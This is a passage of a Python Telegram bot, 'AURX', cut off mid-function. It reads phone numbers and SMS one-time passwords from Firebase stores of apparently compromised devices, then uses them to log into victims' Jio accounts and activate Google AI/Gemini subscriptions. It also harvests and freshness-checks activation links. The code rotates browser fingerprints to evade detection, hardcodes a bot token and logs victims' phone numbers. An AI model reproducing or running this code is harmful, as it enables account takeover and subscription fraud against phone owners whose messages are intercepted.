#!/usr/bin/env python3
"""AURX — Telegram Bot for Jio OTP / Gemini automation.

REVISION:
- Real Gemini-link freshness check: hits Google's serviceactivation page.
  * If the page loads a sign-in / activation form → FRESH (still redeemable)
  * If it errors / already redeemed → USED/EXPIRED
  * If Google is unreachable → UNKNOWN (falls back to history)
- Per-user extraction history (My History button). Only the owner + admin can
  see it.
- Global admin file gemini_users.txt with every extracted link.
- Faster Firebase picker (parallel fetch, 10-min cache, shallow-probe).
- Start Automation always shows the picker (never auto-runs).
"""

from __future__ import annotations

import base64
import concurrent.futures
import gzip
import html
import http.cookiejar
import io
import json
import os
import random
import re
import sqlite3
import sys
import threading
import time
import traceback
import urllib.error
import urllib.parse
import urllib.request
import zlib
from dataclasses import dataclass
from datetime import datetime, timezone
from typing import Any, Mapping, Optional

# ───────────────────────────────────────────────────────────────────────
#  Config
# ───────────────────────────────────────────────────────────────────────
BOT_TOKEN = os.getenv("AURX_BOT_TOKEN", "8877196371:AAExuYNrs4aIp_yIx-k6pdAIbxpFVQWv6X8")
ADMIN_ID = int(os.getenv("AURX_ADMIN_ID", "6369839309"))
BRAND = "AURX"
DB_PATH = os.getenv("AURX_DB", "aurx.db")
FIREBASE_LIST_FILE = os.getenv("AURX_FIREBASE_LIST", "firebase_all.txt")
FIREBASE_NEW_FILE = os.getenv("AURX_FIREBASE_NEW", "firebase_new.txt")
LINK_HISTORY_FILE = os.getenv("AURX_LINK_HISTORY", "link_history.txt")
GEMINI_USERS_FILE = os.getenv("AURX_GEMINI_USERS", "gemini_users.txt")

FORCED_CHANNELS = [
    {"chat": "@newchannelbyaurx", "label": "📢 Main Channel", "url": "https://t.me/newchannelbyaurx"},
    {"chat": "@UpdatesOnSupport11", "label": "🛠 Support Channel", "url": "https://t.me/UpdatesOnSupport11"},
]

POINTS_PER_REFERRAL = 1
HOURS_PER_POINT = 1
COOLDOWN_BETWEEN_RUNS = 20

BASE_URL = "https://www.jio.com"
LOGIN_URL = f"{BASE_URL}/selfcare/login/"
FIREBASE_TIMEOUT = 12
FIREBASE_OTP_MAX_ATTEMPTS = 20
FIREBASE_OTP_POLL_INTERVAL = 1.5
JIO_HTTP_TIMEOUT = 30.0
JIO_OTP_GLOBAL_INTERVAL = 4.0
JIO_OTP_LOCK_BACKOFF = 45.0
JIO_OTP_LOCK_MAX_RETRIES = 2
JIO_LAUNCH_INTERVAL = 1.0
DEVICE_WORKERS = 4
JIO_RETRY_ATTEMPTS = 2
JIO_RETRY_DELAY = 1.0

# Gemini link freshness
GEMINI_CHECK_TIMEOUT = 12
GEMINI_CHECK_WORKERS = 6
GEMINI_FRESH_HINTS = (
    "sign in", "signin", "login", "activate", "confirm",
    "redeem", "claim", "accept", "welcome", "get started",
    "verify", "continue",
)
GEMINI_USED_HINTS = (
    "already", "used", "expired", "invalid", "unavailable",
    "not found", "no longer", "cannot", "can't", "error",
    "redeemed", "claimed",
)

HEADER_ROTATION_INTERVAL = 3
HEADER_VARIANTS = (
    {"Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
     "Cache-Control": "no-cache", "Pragma": "no-cache"},
    {"Accept-Language": "en-US,en;q=0.9", "Cache-Control": "max-age=0"},
    {"Accept-Language": "en-IN,en;q=0.8", "Cache-Control": "no-store"},
)
CLIENT_PROFILES = (
    {"user_agent": ("Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RI32.32-20-9-9-2; wv) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
                    "Chrome/150.0.7871.181 Mobile Safari/537.36"),
     "sec_ch_ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"'},
    {"user_agent": ("Mozilla/5.0 (Linux; Android 13; Pixel 6 Build/TQ3A.230805.001; wv) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
                    "Chrome/150.0.7871.181 Mobile Safari/537.36"),
     "sec_ch_ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"'},
    {"user_agent": ("Mozilla/5.0 (Linux; Android 14; SM-A536E Build/UP1A.231005.007; wv) "
                    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 "
                    "Chrome/150.0.7871.181 Mobile Safari/537.36"),
     "sec_ch_ua": '"Not;A=Brand";v="8", "Chromium";v="150", "Android WebView";v="150"'},
)
NON_RETRYABLE = ("CAPTCHA_REQUIRED", "INVALID_JIONUMBER_ERROR",
                 "INVALID_OTP", "OTP_EXPIRED")

LINK_HOST_PATTERNS = (
    r"serviceactivation\.google\.com",
    r"one\.google\.com/ai",
    r"gemini\.google\.com",
    r"google\.com/subscription",
)
LINK_REGEX = re.compile(r"https?://[^\s\]\)\"'<>]+")

LOADING_FRAMES = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
PROGRESS_BLOCKS = [
    "▱▱▱▱▱▱▱▱▱▱", "▰▱▱▱▱▱▱▱▱▱", "▰▰▱▱▱▱▱▱▱▱",
    "▰▰▰▱▱▱▱▱▱▱", "▰▰▰▰▱▱▱▱▱▱", "▰▰▰▰▰▱▱▱▱▱",
    "▰▰▰▰▰▰▱▱▱▱", "▰▰▰▰▰▰▰▱▱▱", "▰▰▰▰▰▰▰▰▱▱",
    "▰▰▰▰▰▰▰▰▰▱", "▰▰▰▰▰▰▰▰▰▰",
]

_JIO_OTP_LOCK = threading.Lock()
_JIO_OTP_LAST_SENT = [0.0]


def _jio_wait_for_otp_slot():
    with _JIO_OTP_LOCK:
        now = time.monotonic()
        wait = JIO_OTP_GLOBAL_INTERVAL - (now - _JIO_OTP_LAST_SENT[0])
        if wait > 0:
            time.sleep(wait)
        _JIO_OTP_LAST_SENT[0] = time.monotonic()


def esc(text: Any) -> str:
    return html.escape(str(text), quote=False)


def is_activation_link(url: str) -> bool:
    for pat in LINK_HOST_PATTERNS:
        if re.search(pat, url, re.IGNORECASE):
            return True
    return False


def extract_activation_links(text: str) -> list[str]:
    out: list[str] = []
    seen: set[str] = set()
    for m in LINK_REGEX.finditer(text or ""):
        u = m.group(0).rstrip(".,;:!?)\"'")
        if u in seen:
            continue
        if is_activation_link(u):
            seen.add(u)
            out.append(u)
    return out


# ───────────────────────────────────────────────────────────────────────
#  Gemini link freshness checker
# ───────────────────────────────────────────────────────────────────────
def check_gemini_link(url: str,
                      timeout: float = GEMINI_CHECK_TIMEOUT) -> dict:
    """Return {'status': 'fresh'|'used'|'unknown', 'reason': str}.

    FRESH : the page loads something that looks like a sign-in / activate
            prompt (Google's redemption form).
    USED  : the page shows an error / already-redeemed style message.
    UNKNOWN: we couldn't determine — network error or unfamiliar response.
    """
    result = {"status": "unknown", "reason": ""}
    if not url or not is_activation_link(url):
        result["reason"] = "not an activation link"
        return result

    headers = {
        "User-Agent": ("Mozilla/5.0 (Linux; Android 13; Pixel 6) "
                       "AppleWebKit/537.36 (KHTML, like Gecko) "
                       "Chrome/150.0.7871.181 Mobile Safari/537.36"),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-IN,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }
    try:
        req = urllib.request.Request(url, headers=headers, method="GET")
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status = resp.getcode()
            final_url = resp.geturl()
            raw = resp.read(200_000)
    except urllib.error.HTTPError as e:
        status = e.code
        final_url = e.geturl() if hasattr(e, "geturl") else url
        try:
            raw = e.read(200_000)
        except Exception:
            raw = b""
    except Exception as e:
        result["reason"] = f"network: {e}"
        return result

    try:
        enc = "gzip" if raw[:2] == b"\x1f\x8b" else None
        if enc == "gzip":
            try:
                raw = gzip.decompress(raw)
            except Exception:
                pass
        body = raw.decode("utf-8", errors="replace")
    except Exception:
        body = ""

    low = body.lower()

    # 404 / 410 style → definitely used or invalid
    if status in (404, 410, 451):
        result["status"] = "used"
        result["reason"] = f"HTTP {status}"
        return result

    # Google login redirect → link is still valid, needs sign-in to redeem
    if "accounts.google.com" in final_url.lower() or "/signin" in final_url.lower():
        result["status"] = "fresh"
        result["reason"] = "redirects to Google sign-in"
        return result

    # Explicit already-used patterns
    for hint in GEMINI_USED_HINTS:
        if hint in low:
            # word-boundary-ish check to avoid false positives inside JS
            if re.search(r"\b" + re.escape(hint) + r"\b", low):
                result["status"] = "used"
                result["reason"] = f"contains '{hint}'"
                return result

    # Fresh hints (sign-in form, activation prompt)
    for hint in GEMINI_FRESH_HINTS:
        if hint in low:
            result["status"] = "fresh"
            result["reason"] = f"contains '{hint}'"
            return result

    # 200 with content but we don't recognise it — treat as unknown
    if status == 200 and len(body) > 100:
        result["reason"] = "unrecognised 200 response"
        return result

    result["reason"] = f"HTTP {status}"
    return result


def check_gemini_links_parallel(urls: list[str],
                                max_workers: int = GEMINI_CHECK_WORKERS
                                ) -> dict[str, dict]:
    """Check many URLs in parallel. Returns {url: result_dict}."""
    out: dict[str, dict] = {}
    if not urls:
        return out
    with concurrent.futures.ThreadPoolExecutor(
            max_workers=min(max_workers, len(urls))) as ex:
        futs = {ex.submit(check_gemini_link, u): u for u in urls}
        for fut in concurrent.futures.as_completed(futs):
            u = futs[fut]
            try:
                out[u] = fut.result()
            except Exception as e:
                out[u] = {"status": "unknown", "reason": str(e)}
    return out


# ───────────────────────────────────────────────────────────────────────
#  Per-user history + global admin file
# ───────────────────────────────────────────────────────────────────────
class HistoryStore:
    """Per-user history (DB) + global admin file (gemini_users.txt)."""

    def __init__(self, db: "DB", users_file: str = GEMINI_USERS_FILE):
        self.db = db
        self.users_file = users_file
        self.lock = threading.Lock()

    def record(self, uid: int, first_name: str, *,
               firebase: str, phone: str,
               url: str, status: str, reason: str = "") -> None:
        """Save into per-user history and the global file."""
        with self.lock:
            self.db.add_history(
                user_id=uid, firebase=firebase, phone=phone,
                url=url, status=status, reason=reason,
            )
            try:
                with open(self.users_file, "a", encoding="utf-8") as f:
                    f.write(
                        f"{time.time():.3f} | {uid} | {first_name or '-'} | "
                        f"{status.upper():7s} | {phone or '-'} | "
                        f"{firebase} | {url}\n"
                    )
            except Exception:
                pass

    def user_history(self, uid: int, limit: int = 100) -> list[sqlite3.Row]:
        return self.db.user_history(uid, limit=limit)

    def count_user(self, uid: int) -> int:
        return self.db.count_user_history(uid)

    def count_all(self) -> int:
        return self.db.count_all_history()


# ───────────────────────────────────────────────────────────────────────
#  Link History (global fresh-vs-used by URL)
# ───────────────────────────────────────────────────────────────────────
class LinkHistory:
    def __init__(self, path: str = LINK_HISTORY_FILE):
        self.path = path
        self.lock = threading.Lock()
        self.seen: dict[str, dict] = {}
        self._load()

    def _load(self):
        if not os.path.exists(self.path):
            return
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    parts = line.split(" | ", 3)
                    if len(parts) == 4:
                        try:
                            self.seen[parts[3]] = {
                                "ts": float(parts[0]),
                                "user_id": int(parts[1]),
                                "phone": parts[2],
                            }
                        except Exception:
                            pass
        except Exception:
            pass

    def was_seen(self, url: str) -> bool:
        with self.lock:
            return url in self.seen

    def record(self, url: str, *, user_id: int = 0, phone: str = "") -> None:
        with self.lock:
            if url in self.seen:
                return
            self.seen[url] = {"ts": time.time(),
                              "user_id": user_id, "phone": phone}
            try:
                with open(self.path, "a", encoding="utf-8") as f:
                    f.write(f"{time.time():.3f} | {user_id} | {phone} | {url}\n")
            except Exception:
                pass

    def count(self) -> int:
        with self.lock:
            return len(self.seen)


# ───────────────────────────────────────────────────────────────────────
#  Jio HTTP client
# ───────────────────────────────────────────────────────────────────────
@dataclass
class HttpResult:
    status: int
    data: Any
    text: str
    @property
    def ok(self) -> bool:
        return 200 <= self.status < 300


class JioAuthClient:
    def __init__(self, timeout: float = JIO_HTTP_TIMEOUT):
        self.timeout = timeout
        self.client_profile = random.choice(CLIENT_PROFILES)
        self._request_count = 0
        self._header_variant = 0
        self._header_lock = threading.Lock()
        self.cookies = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookies))
        self.common_headers = {
            "User-Agent": self.client_profile["user_agent"],
            "sec-ch-ua": self.client_profile["sec_ch_ua"],
            "sec-ch-ua-platform": '"Android"',
            "sec-ch-ua-mobile": "?1",
            "Accept": "*/*",
            "X-Requested-With": "mark.via.gp",
            "Accept-Language": "en-IN,en-US;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Dest": "empty",
        }

    @staticmethod
    def _decode_body(body: bytes, headers: Mapping[str, str]) -> str:
        encoding = headers.get("Content-Encoding", "").lower()
        try:
            if "gzip" in encoding:
                body = gzip.decompress(body)
            elif "deflate" in encoding:
                try:
                    body = zlib.decompress(body)
                except zlib.error:
                    body = zlib.decompress(body, -zlib.MAX_WBITS)
        except (OSError, zlib.error):
            pass
        ct = headers.get("Content-Type", "")
        m = re.search(r"charset=([^;\s]+)", ct, re.I)
        charset = m.group(1).strip('"\'') if m else "utf-8"
        try:
            return body.decode(charset, errors="replace")
        except LookupError:
            return body.decode("utf-8", errors="replace")

    def request(self, method: str, path_or_url: str,
                body: Optional[Mapping[str, Any]] = None) -> HttpResult:
        url = path_or_url if path_or_url.startswith("http") else BASE_URL + path_or_url
        with self._header_lock:
            self._request_count += 1
            if (self._request_count > 1
                    and (self._request_count - 1) % HEADER_ROTATION_INTERVAL == 0):
                self._header_variant = (self._header_variant + 1) % len(HEADER_VARIANTS)
            header_variant = HEADER_VARIANTS[self._header_variant]
        headers = dict(self.common_headers)
        headers.update(header_variant)
        headers["Referer"] = LOGIN_URL
        encoded_body = None
        if body is not None:
            headers["Content-Type"] = "application/json"
            headers["Origin"] = BASE_URL
            encoded_body = json.dumps(body, separators=(",", ":")).encode("utf-8")
        request = urllib.request.Request(
            url=url, data=encoded_body, headers=headers, method=method.upper())
        try:
            with self.opener.open(request, timeout=self.timeout) as response:
                raw = response.read()
                status = response.getcode()
                text = self._decode_body(raw, response.headers)
        except urllib.error.HTTPError as error:
            raw = error.read()
            status = error.code
            text = self._decode_body(raw, error.headers)
        except urllib.error.URLError as error:
            raise RuntimeError(f"Network error: {error.reason}") from error
        try:
            data = json.loads(text) if text else {}
        except json.JSONDecodeError:
            data = {"raw": text}
        return HttpResult(status=status, data=data, text=text)

    @staticmethod
    def normalize_mobile(value: str) -> str:
        digits = re.sub(r"\D", "", value or "")
        if digits.startswith("91") and len(digits) == 12:
            digits = digits[2:]
        if not re.fullmatch(r"[6-9]\d{9}", digits):
            raise ValueError("Invalid 10-digit Indian mobile number")
        return digits

    @staticmethod
    def normalize_otp(value: str) -> str:
        otp = str(value or "").strip()
        if not re.fullmatch(r"\d{4,6}", otp):
            raise ValueError("OTP must contain 4 to 6 digits")
        return otp.zfill(6)

    @staticmethod
    def _error_message(result: HttpResult, operation: str) -> str:
        if isinstance(result.data, dict):
            message = (result.data.get("errorMessage")
                       or result.data.get("responseMsg")
                       or result.data.get("responseMessage")
                       or result.data.get("error"))
            if message:
                return str(message)
        return f"{operation} failed with HTTP {result.status}"

    def send_otp(self, mobile_number: str) -> HttpResult:
        mobile = self.normalize_mobile(mobile_number)
        try:
            self.request("GET", LOGIN_URL)
        except Exception:
            pass
        last_error = None
        for attempt in range(1, JIO_OTP_LOCK_MAX_RETRIES + 2):
            _jio_wait_for_otp_slot()
            result = self.request(
                "POST", "/api/jio-login-service/login/sendOtp",
                {"mobileNumber": mobile, "loginFlowType": "MOBILE",
                 "alternateNumber": ""})
            if result.ok and isinstance(result.data, dict) \
                    and str(result.data.get("responseCode")) == "200":
                return result
            last_error = self._error_message(result, "sendOtp")
            if "SEND_OTP_CURRENTLY_LOCKED" in str(last_error).upper() \
                    and attempt <= JIO_OTP_LOCK_MAX_RETRIES:
                time.sleep(JIO_OTP_LOCK_BACKOFF)
                continue
            raise RuntimeError(last_error)
        raise RuntimeError(last_error or "sendOtp failed")

    def validate_otp(self, otp: str) -> HttpResult:
        otp_value = self.normalize_otp(otp)
        result = self.request(
            "POST", "/api/jio-login-service/login/validateOtp", {"otp": otp_value})
        if not result.ok or not (isinstance(result.data, dict)
                                 and str(result.data.get("responseCode")) == "200"):
            raise RuntimeError(self._error_message(result, "validateOtp"))
        return result

    def post_login_flow(self) -> dict[str, Any]:
        time.sleep(1)
        auth_data: Any = {}
        activate_result: Any = {}
        google_ai_result: Any = {}
        try:
            auth_data = self.request(
                "GET", "/api/jio-authenticate-service/authenticate/authJsonData"
            ).data or {}
        except Exception:
            pass
        try:
            activate_result = self.request(
                "GET",
                "/api/jio-ott-service/ott/subscription/activate/Z0241?source=JIO"
            ).data or {}
        except Exception as e:
            activate_result = {"error": str(e)}
        try:
            google_ai_result = self.request(
                "GET", "/api/jio-ott-service/ott/subscription/google-ai"
            ).data or {}
        except Exception as e:
            google_ai_result = {"error": str(e)}
        return {"success": True, "userData": auth_data,
                "activateResult": activate_result,
                "googleAiResult": google_ai_result}


# ───────────────────────────────────────────────────────────────────────
#  Firebase helpers
# ───────────────────────────────────────────────────────────────────────
def parse_firebase_link(link: str) -> Optional[str]:
    link = (link or "").strip()
    if not link:
        return None
    if link.startswith(("http://", "https://")) and (
        "firebaseio.com" in link or "firebasedatabase.app" in link
    ):
        return link.rstrip("/") + "/"
    parsed = urllib.parse.urlparse(link)
    qs = urllib.parse.parse_qs(parsed.query)
    encoded = qs.get("s", [None])[0]
    if not encoded:
        return None
    try:
        encoded += "=" * (-len(encoded) % 4)
        decoded = base64.b64decode(encoded).decode("utf-8").split("|")[0].strip()
        if "firebaseio.com" not in decoded and "firebasedatabase.app" not in decoded:
            return None
        return decoded.rstrip("/") + "/"
    except Exception:
        return None


def extract_firebase_links_from_text(text: str) -> list[str]:
    cands: list[str] = []
    for m in re.finditer(
        r"https?://[^\s\]\)\"'<>]+(?:firebaseio\.com|firebasedatabase\.app)[^\s\]\)\"'<>]*",
        text):
        cands.append(m.group(0))
    for m in re.finditer(r"https?://[^\s\]\)\"'<>]*\?s=[A-Za-z0-9_\-=+/%]+", text):
        cands.append(m.group(0))
    seen: set[str] = set()
    out: list[str] = []
    for raw in cands:
        p = parse_firebase_link(raw)
        if p and p not in seen:
            seen.add(p)
            out.append(p)
    return out


def _is_online_device(data: Any) -> bool:
    if not isinstance(data, dict):
        return False
    for key in ("status", "state", "online", "isOnline", "connected", "isConnected"):
        value = data.get(key)
        if value is True or value == 1:
            return True
        if isinstance(value, str) and value.strip().lower() in {
            "true", "online", "connected", "active", "ready"
        }:
            return True
    return False


def _extract_phone_from_messages(device_messages: Mapping[str, Any]) -> Optional[str]:
    patterns = [
        (re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"), 10),
        (re.compile(r"\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b", re.IGNORECASE), 15),
        (re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"), 5),
    ]
    counts: dict[str, int] = {}
    for msg in device_messages.values():
        if not isinstance(msg, dict):
            continue
        text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
        for pattern, score in patterns:
            for number in pattern.findall(text):
                counts[number] = counts.get(number, 0) + score
    if not counts:
        return None
    return max(counts, key=counts.get)


def _fb_get_json(url: str, timeout: float) -> Any:
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return json.loads(r.read().decode("utf-8") or "{}")
    except Exception as e:
        print(f"[firebase] GET failed {url}: {e}", file=sys.stderr)
        return {}


def fetch_firebase_snapshot(firebase_url: str,
                            timeout: float = FIREBASE_TIMEOUT) -> tuple[dict, dict]:
    base = firebase_url.rstrip("/")
    clients: dict = {}
    messages: dict = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
        f_clients = ex.submit(_fb_get_json, f"{base}/clients.json", timeout)
        f_messages = ex.submit(_fb_get_json, f"{base}/messages.json", timeout)
        try:
            clients = f_clients.result(timeout=timeout + 2)
        except Exception:
            clients = {}
        try:
            messages = f_messages.result(timeout=timeout + 2)
        except Exception:
            messages = {}
    if not isinstance(clients, dict):
        clients = {}
    if not isinstance(messages, dict):
        messages = {}
    return clients, messages


def fb_device_stats(firebase_url: str, timeout: float = 5.0) -> dict:
    """Fast picker stats: total, online, unique phones."""
    base = firebase_url.rstrip("/")
    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
        f_clients = ex.submit(_fb_get_json, f"{base}/clients.json", timeout)
        f_msgs = ex.submit(_fb_get_json, f"{base}/messages.json", timeout)
        try:
            clients = f_clients.result(timeout=timeout + 2)
        except Exception:
            clients = {}
        try:
            messages = f_msgs.result(timeout=timeout + 2)
        except Exception:
            messages = {}
    if not isinstance(clients, dict):
        clients = {}
    if not isinstance(messages, dict):
        messages = {}
    total = len(clients)
    online = 0
    phones: set[str] = set()
    for cid, cdata in clients.items():
        if _is_online_device(cdata):
            online += 1
        dev_msgs = messages.get(str(cid), {}) if isinstance(messages, dict) else {}
        phone = _extract_phone_from_messages(dev_msgs)
        if phone:
            phones.add(phone)
    return {"total": total, "online": online, "phones": len(phones)}


def list_devices_with_phones(firebase_url: str,
                             timeout: float = FIREBASE_TIMEOUT) -> list[dict]:
    clients, messages = fetch_firebase_snapshot(firebase_url, timeout=timeout)
    out: list[dict] = []
    seen: set[str] = set()
    for cid, cdata in clients.items():
        dev_msgs = messages.get(str(cid), {}) if isinstance(messages, dict) else {}
        phone = _extract_phone_from_messages(dev_msgs)
        if not phone or phone in seen:
            continue
        seen.add(phone)
        out.append({
            "client_id": str(cid),
            "phone": phone,
            "online": _is_online_device(cdata),
            "messages": dev_msgs if isinstance(dev_msgs, dict) else {},
        })
    return out


def _extract_otp_from_messages(device_messages: Mapping[str, Any],
                               trigger_time_ms: int) -> Optional[str]:
    for msg_id in reversed(list(device_messages.keys())):
        msg_data = device_messages[msg_id]
        if not isinstance(msg_data, dict):
            continue
        try:
            if int(msg_id) < (trigger_time_ms - 30000):
                continue
        except Exception:
            pass
        body = (msg_data.get("body") or msg_data.get("message")
                or msg_data.get("text") or msg_data.get("sms") or "")
        match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", str(body))
        if match:
            return match.group(0)
    return None


def poll_firebase_for_otp(firebase_url: str, client_id: str, trigger_time_ms: int,
                          max_attempts: int = FIREBASE_OTP_MAX_ATTEMPTS,
                          poll_interval: float = FIREBASE_OTP_POLL_INTERVAL,
                          timeout: float = FIREBASE_TIMEOUT) -> Optional[str]:
    base = firebase_url.rstrip("/")
    url = f"{base}/messages/{client_id}.json"
    for _ in range(max_attempts):
        time.sleep(poll_interval)
        try:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                msgs = json.loads(r.read().decode("utf-8") or "{}")
            if not isinstance(msgs, dict):
                continue
            otp = _extract_otp_from_messages(msgs, trigger_time_ms)
            if otp:
                return otp
        except Exception:
            continue
    return None


def extract_links_from_fb(firebase_url: str) -> list[str]:
    clients, messages = fetch_firebase_snapshot(firebase_url)
    if not isinstance(messages, dict):
        return []
    out: list[str] = []
    seen: set[str] = set()
    for dev_msgs in messages.values():
        if not isinstance(dev_msgs, dict):
            continue
        for msg in dev_msgs.values():
            if not isinstance(msg, dict):
                continue
            body = str(msg.get("body") or msg.get("message")
                       or msg.get("text") or msg.get("sms") or "")
            for u in extract_activation_links(body):
                if u not in seen:
                    seen.add(u)
                    out.append(u)
    return out


def _retry(operation: str, func: Any,
           retries: int = JIO_RETRY_ATTEMPTS,
           delay: float = JIO_RETRY_DELAY) -> Any:
    last = None
    for attempt in range(1, max(1, retries) + 1):
        try:
            return func()
        except Exception as e:
            last = e
            msg = str(e).upper()
            if any(tok in msg for tok in NON_RETRYABLE):
                break
            if attempt < retries:
                time.sleep(delay)
    raise RuntimeError(f"{operation} failed: {last}")


# ───────────────────────────────────────────────────────────────────────
#  Firebase registry
# ───────────────────────────────────────────────────────────────────────
class FirebaseRegistry:
    def __init__(self, all_path: str = FIREBASE_LIST_FILE,
                 new_path: str = FIREBASE_NEW_FILE):
        self.all_path = all_path
        self.new_path = new_path
        self.lock = threading.Lock()
        self.seen: set[str] = set()
        self.new_found: list[dict] = []
        self._load()

    def _load(self):
        if os.path.exists(self.all_path):
            try:
                with open(self.all_path, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            self.seen.add(line)
            except Exception:
                pass
        if os.path.exists(self.new_path):
            try:
                with open(self.new_path, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        parts = line.split(" | ", 3)
                        if len(parts) == 4:
                            try:
                                self.new_found.append({
                                    "ts": float(parts[0]),
                                    "user_id": int(parts[1]),
                                    "first_name": parts[2],
                                    "url": parts[3],
                                })
                            except Exception:
                                pass
            except Exception:
                pass

    def add_many(self, urls: list[str], *, user_id: int = 0,
                 first_name: str = "") -> list[str]:
        new: list[str] = []
        with self.lock:
            for url in urls:
                if url not in self.seen:
                    self.seen.add(url)
                    new.append(url)
            if new:
                with open(self.all_path, "a", encoding="utf-8") as f:
                    for url in new:
                        f.write(url + "\n")
                now = time.time()
                with open(self.new_path, "a", encoding="utf-8") as f:
                    for url in new:
                        f.write(f"{now:.3f} | {user_id} | {first_name} | {url}\n")
                        self.new_found.append({
                            "ts": now, "user_id": user_id,
                            "first_name": first_name, "url": url})
        return new

    def all(self) -> list[str]:
        with self.lock:
            return sorted(self.seen)

    def count(self) -> int:
        with self.lock:
            return len(self.seen)

    def new_count(self) -> int:
        with self.lock:
            return len(self.new_found)

    def recent_new(self, limit: int = 60) -> list[dict]:
        with self.lock:
            return list(reversed(self.new_found[-limit:]))


# ───────────────────────────────────────────────────────────────────────
#  DB
# ───────────────────────────────────────────────────────────────────────
class DB:
    def __init__(self, path: str):
        self.path = path
        self.lock = threading.Lock()
        self._init()

    def _conn(self) -> sqlite3.Connection:
        c = sqlite3.connect(self.path, timeout=30)
        c.row_factory = sqlite3.Row
        return c

    def _init(self):
        with self.lock, self._conn() as c:
            c.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                user_id      INTEGER PRIMARY KEY,
                username     TEXT,
                first_name   TEXT,
                points       INTEGER NOT NULL DEFAULT 0,
                access_until REAL    NOT NULL DEFAULT 0,
                referred_by  INTEGER,
                refer_count  INTEGER NOT NULL DEFAULT 0,
                joined_at    REAL    NOT NULL,
                last_seen    REAL    NOT NULL
            );
            CREATE TABLE IF NOT EXISTS runs (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER NOT NULL,
                started_at REAL    NOT NULL,
                result     TEXT
            );
            CREATE TABLE IF NOT EXISTS user_firebases (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER NOT NULL,
                url        TEXT    NOT NULL,
                added_at   REAL    NOT NULL,
                UNIQUE(user_id, url)
            );
            CREATE TABLE IF NOT EXISTS history (
                id         INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id    INTEGER NOT NULL,
                firebase   TEXT,
                phone      TEXT,
                url        TEXT    NOT NULL,
                status     TEXT    NOT NULL DEFAULT 'unknown',
                reason     TEXT,
                added_at   REAL    NOT NULL
            );
            CREATE INDEX IF NOT EXISTS idx_history_user
                ON history(user_id, added_at DESC);
            """)
            c.commit()

    # ---- users ----
    def get_user(self, uid: int) -> Optional[sqlite3.Row]:
        with self._conn() as c:
            return c.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()

    def upsert_user(self, uid: int, username: str, first_name: str):
        now = time.time()
        with self.lock, self._conn() as c:
            row = c.execute("SELECT user_id FROM users WHERE user_id=?", (uid,)).fetchone()
            if row:
                c.execute("UPDATE users SET username=?, first_name=?, last_seen=? WHERE user_id=?",
                          (username, first_name, now, uid))
            else:
                c.execute("""INSERT INTO users
                    (user_id, username, first_name, points, access_until, joined_at, last_seen)
                    VALUES (?,?,?,?,?,?,?)""",
                    (uid, username, first_name, 0, 0, now, now))
            c.commit()

    def set_referrer(self, uid: int, ref_id: int) -> bool:
        with self.lock, self._conn() as c:
            row = c.execute("SELECT referred_by, joined_at FROM users WHERE user_id=?",
                            (uid,)).fetchone()
            if not row or row["referred_by"] is not None:
                return False
            if time.time() - row["joined_at"] > 300:
                return False
            if ref_id == uid:
                return False
            if not c.execute("SELECT user_id FROM users WHERE user_id=?", (ref_id,)).fetchone():
                return False
            c.execute("UPDATE users SET referred_by=? WHERE user_id=?", (ref_id, uid))
            c.execute("UPDATE users SET refer_count=refer_count+1 WHERE user_id=?", (ref_id,))
            c.commit()
        return True

    def add_points(self, uid: int, delta: int) -> int:
        with self.lock, self._conn() as c:
            row = c.execute("SELECT points, access_until FROM users WHERE user_id=?",
                            (uid,)).fetchone()
            if not row:
                return 0
            new_points = max(0, int(row["points"]) + int(delta))
            now = time.time()
            base = max(now, float(row["access_until"] or 0))
            if delta > 0:
                new_access = base + delta * HOURS_PER_POINT * 3600
            else:
                new_access = max(now, base - (-delta) * HOURS_PER_POINT * 3600)
            c.execute("UPDATE users SET points=?, access_until=? WHERE user_id=?",
                      (new_points, new_access, uid))
            c.commit()
            return new_points

    def all_users(self) -> list[sqlite3.Row]:
        with self._conn() as c:
            return c.execute("SELECT * FROM users ORDER BY joined_at DESC").fetchall()

    def stats(self) -> dict:
        with self._conn() as c:
            total = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
            active = c.execute("SELECT COUNT(*) FROM users WHERE access_until>?",
                               (time.time(),)).fetchone()[0]
            now = time.time()
            day = c.execute("SELECT COUNT(*) FROM users WHERE last_seen>?",
                            (now - 86400,)).fetchone()[0]
            week = c.execute("SELECT COUNT(*) FROM users WHERE last_seen>?",
